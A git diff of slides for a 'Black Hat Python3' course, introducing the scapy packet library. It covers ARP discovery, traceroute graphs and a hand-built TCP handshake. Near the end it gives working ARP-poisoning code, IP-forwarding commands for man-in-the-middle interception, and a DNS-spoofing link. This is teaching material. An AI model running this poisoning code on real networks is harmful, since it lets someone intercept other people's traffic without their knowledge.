@@ -1,4 +1,4 @@
-## Welcome to class 4!
+## Welcome to class 5!
 
 ### Black Hat Python3 
 
@@ -14,215 +14,254 @@ https://github.com/tiarno/bhp3_class
 
 ## Summary from last class
 
-- Joining threads (blocking)
-- Briefly, context managers (`with ...`)
-- lxml for web scraping
-- sockets
-- IP, ICMP headers and parsing
-
----
-
-## UDP Scanner
-
-- how it works
-- UDP packet to unused port
-    - network unreachable (from router)
-    - host unreachable (from router)
-    - port unreachable **!** type 3, code 3
-
----
-
-## Test it out
-
-- `scanner.py`
-
----
-
-## Python details
-
-- git
-- imports
-- ipaddress
-- bytes/strings
+- UDP scanning
+- Git commands on local
+- Git commands for remote/upstream
+- python import techniques
+- code reuse (`getwords`)
 - context managers
 
 ---
 
-## Git Local
+## scapy
 
-Plain Git:
-
-- add
-- commit 
-- status
-- git log --pretty=oneline
+- python library
+- interative tool using Python REPL (shell)
+- create, decode, send, receive packets
 
 ---
 
-## Git and GitHub
-
-- git fork is a GitHub thing only
-- `git clone` (get a copy of a repo)
-- git and your local repo:
-    - add/commit changes
-    - can have a remote (e.g., GitHub)
-    - git pull (pulls down updates from the remote)
-    - git push (pushes up changes to the remote of your repo)
-
-    - can have an upstream (from the original fork: a GitHub thing)
-
----
-
-## imports
-
-- `__init__.py`
-- import os -> os.path, os.listdir()
-- from lxml import etree -> etree.parse()
-- import multiprocessing as mp -> mp.Process()
-- from ctypes import * -> Structure
-
----
-
-## word finder function
-
-### Code reuse!
-
-- `bhp3_class/web/__init__.py` -> getwords()
-- `dirfinder2.py`
-- `wp_killer2.py`
-
----
-
-## `ipaddress` package
+## Interactive scapy shell
 
 ```python
-  IPv4Network('192.168.1.69/16')
-    .hosts() -> iterator over usable hosts in network
+>>> IP()
+<IP |>
+>>> target="www.google.com/30"
+>>> ip=IP(dst=target)
+>>> ip
+<IP  dst=<Net www.google.com/30> |>
+>>> ips = [p for p in ip]
+>>> ips
+[<IP  dst=172.217.4.36 |>, <IP  dst=172.217.4.37 |>, 
+ <IP  dst=172.217.4.38 |>, <IP  dst=172.217.4.39 |>]
 
-  ipaddress.ip_address(self.src)
+>>> a = ips[0]
+>>> a.dst
+172.217.4.36
+>>> a.ttl
+64
 ```
 
 ---
 
-## Network Scanner code:
-
-scanner.py
-```
-for ip in ipaddress.ip_network(SUBNET).hosts():
-    send packet to ip
-```
-
----
-
-## Bytes vs Strings
-
-- sockets, processes return bytes
-- bytes are the computer's language
-- strings are our language
-- string.encode() -> bytes
-- bytes.decode() -> string
-
-Usually the decoding is to a UTF-8 string
-
----
+## Another view
 
 ```
-S.encode(encoding='utf-8', errors='strict') -> bytes
-    Encode S using the codec registered for encoding. 
-
-B.decode(encoding='utf-8', errors='strict') -> string
-    Decode the bytes using the codec registered for encoding.
-```
-
-Default encoding is 'utf-8'
-
----
-
-## Context Managers
-
-- As a class, define `__enter__` and `__exit__`
-- As a generator (`try: finally:`)
-    - code before the `yield` == `__enter__`
-    - code in the `finally` block is the `__exit__`
-
----
-
-```
-@contextmanager
-def some_generator(<arguments>):
-    <setup>
-    try:
-        yield <value>
-    finally:
-        <cleanup>
-```
-
-So that
-
-```
-with some_generator(<arguments>) as <variable>:
-   <body>
-
-```
-
-is 
-equivalent to this:
-
-```
-<setup>
-try:
-   <variable> = <value>
-   <body>
-finally:
-    <cleanup>
+>>> str(a)
+"b'E\\x00\\x00\\x14\\x00\\x01\\x00\\x00@\\x00\\x07\\xff\\xc0\\xa8\\x01E\\xac\\xd9\\x04$'"
+>>> new_ip = IP(str(a))
+>>> new_ip
+<IP  version=6 ihl=2 tos=0x27 len=17756 id=30768 flags=MF frag=4188 ttl=120 proto=dsr chksum=0x305c src=120.49.52.92 dst=120.48.48.92 options=[<IPOption  copy_flag=0 optclass=3 option=upstream_multicast_packet length=48 value='1\\x00\\x00@\\x00\\x07\\xff\\xc0\\xa8\\x01E\\x' |>] |<Raw  load="ac\\xd9\\x04$'" |>>
 ```
 
 ---
 
-- Can use `contextlib.contextmanager` decorator
-- Built in context managers (e. g., files, sockets)
-- closing, redirect_stdout, see doc for more...
+## `lsc()`, `ls()`
+
+- IP
+- TCP
+- ICMP
 
 ---
 
-```
-with closing(<module>.open(<arguments>)) as f:
-    <block>
-```
-is equivalent to this:
+## Common Commands
 
-```
-f = <module>.open(<arguments>)
-try:
-    <block>
-finally:
-    f.close()
+- rdppcap
+- wrpcap
+- send
+- sr
+- sniff
+- filter (BPF)
+
+---
+
+## ARP
+
+```python
+ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+arp = ARP(pdst='192.168.1.69/24')
+ans, unans = srp(ether/arp, iface='en0', timeout=2) #Layer2
+for snd, rcv in ans:
+    print(rcv.sprintf(r"%ARP.psrc% %Ether.src%").split())
 ```
 
 ---
 
-## `redirect_stdout`
+## Even Faster:
 
-How to write help() to a file
+```python
+r, u = arping('192.168.1.0/24')
+```
 
+```python
+r[0][1].show()
+```
+
+---
+
+## ARP watch
+
+```python
+from scapy.all import ARP, sniff
+
+def arp_display(pkt):
+    if pkt[ARP].op == 1:  # who-has (request)
+        return f'Request: {pkt[ARP].psrc} is asking about {pkt[ARP].pdst}'
+    if pkt[ARP].op == 2:  # is-at (response)
+        return f'*Response: {pkt[ARP].hwsrc} has address {pkt[ARP].psrc}'
+ 
+sniff(prn=arp_display, filter='arp', store=0, count=10)
+```
+
+---
+
+## Scapy Graphics
+
+```python
+res, unans = traceroute(['reachtim.com'], dport=[443], maxttl=20, retry=-2)
+
+res.graph()
+```
+
+---
+
+```python
+hosts = [
+    'www.microsoft.com', 'www.cisco.com', 
+    'www.yahoo.com', 'www.wanadoo.fr', 
+    'www.pacsec.com']
+
+res, unans = traceroute(hosts, dport=[80,443], maxttl=20, retry=-2)
+res.graph()
+```
+
+---
+
+```python
+a = Ether()/IP(dst="www.slashdot.org")/TCP()/"GET /index.html HTTP/1.0 \n\n"
+
+hexdump(a)
+
+a[0].pdfdump(layer_shift=1)
+```
+http://www.asciitable.com
+
+---
+
+## BPF
+
+http://biot.com/capstats/bpf.html
+
+---
+
+## Three-way Handshake
+
+- on client:
+    - `iptables -t filter -I OUTPUT -p tcp --sport 10000 --tcp-flags RST RST -j DROP`
+    - `tcpdump -ni any port 8000 -S`
+
+---
+
+```python
+me, sport = '192.168.1.100', 10000
+them, dport = '192.168.1.69', 8000
+#
+ip = IP(src=me, dst=them)
+syn = TCP(sport=sport, dport=dport, flags='S', seq=1000)
+synack = sr1(ip/syn)
+ack = TCP(sport=sport, dport=dport, flags='A', seq=synack.ack, ack=synack.seq+1)
+send(ip/ack)
+```
+
+---
+
+## ARP Poison
+
+- poison ARP cache of two devices
+- tell each device attacker MAC is the other's address
+- man-in-the-middle: monitor communications
+
+
+- mac: `sysctl -w net.inet.ip.forwarding=1`
+- linux: `echo 1 > /proc/sys/net/ipv4/ip_forward`
+
+---
+
+## ARP Poison code
+
+```python
+mymac = get_if_hwaddr('en0')
+victim = '192.168.1.100'
+gateway = '192.168.1.254'
+packet = Ether()/ARP(op='who-has', hwsrc=mymac, psrc=victim, pdst=gateway)
+sendp(packet)
+packet = Ether()/ARP(op='who-has', hwsrc=mymac, psrc=gateway, pdst=victim)
+sendp(packet)
+```
+
+---
+
+## Python Named Tuples
+
+- immutable
+- reference values like object properties
+- more readable code
 
 ```
-with open('help.txt', 'w') as f:
-    with redirect_stdout(f):
-        help(pow)
+Point = namedtuple('Point', 'x y')
+pt = Point(1.0, 2.0)
+pt.x
+pt.y
 ```
+
+---
+
+## ARP Poison Program
+
+`arper.py`
+
+---
+
+## DNS Spoofing:
+
+https://thepacketgeek.com/scapy-p-09-scapy-and-dns/
 
 ---
 
 ## Your Job
 
-- Write your own network scanner, place it in `packets` module
-- Read about context managers
-- Become familiar with bytes vs strings, encoding vs decoding.
+- Reading (links below)
+- Create your ARP Poison program
+- Recreate your network scanner using scapy
+- Consider ways to protect against it
 
 ---
+
+## Reading
+
+
+1. https://scapy.net/demo/
+2. https://thepacketgeek.com/series/building-network-tools-with-scapy/
+3. https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html
+4. https://codingsec.net/2016/06/arp-spoofing-attack/
+5. http://biot.com/capstats/bpf.html
+
+
+---
+
 
 ## Feedback please!
 
 - tim@reachtim.com
 - discord: https://discord.gg/WR23qUj
+
